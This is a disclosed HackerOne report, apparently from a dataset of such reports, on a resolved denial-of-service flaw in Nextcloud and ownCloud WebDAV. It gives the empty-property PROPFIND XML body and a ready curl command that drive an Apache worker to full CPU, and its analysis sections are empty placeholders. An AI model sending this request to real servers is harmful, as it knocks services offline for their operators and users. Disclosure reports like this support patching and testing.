---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '255822'
original_report_id: '255822'
title: WebDAV Empty Property search leads to full CPU usage
weakness: Uncontrolled Resource Consumption
team_handle: nextcloud
created_at: '2017-08-02T14:53:24.064Z'
disclosed_at: '2020-03-01T14:08:49.772Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
asset_identifier: nextcloud/server
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# WebDAV Empty Property search leads to full CPU usage

## Metadata

- HackerOne Report ID: 255822
- Weakness: Uncontrolled Resource Consumption
- Program: nextcloud
- Disclosed At: 2020-03-01T14:08:49.772Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Tested with the following versions:
 - [owncloud:10.0](https://hub.docker.com/_/owncloud/)
 - [nextcloud:12.0](https://hub.docker.com/_/nextcloud/)

with mariadb in place.

A `PROFIND nextcloud/remote.php/webdav/` with

```xml
<?xml version="1.0"?>
<a:propfind xmlns:a="DAV:">
<a:prop></a:prop>
</a:propfind>
```
as body causes full CPU utilization of one Apache worker process.

in curl form:
```
curl -i --user testuser:testpass -X PROPFIND -d '<?xml version="1.0"?><a:propfind xmlns:a="DAV:"><a:prop></a:prop></a:propfind>' http://nextcloud/remote.php/webdav
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
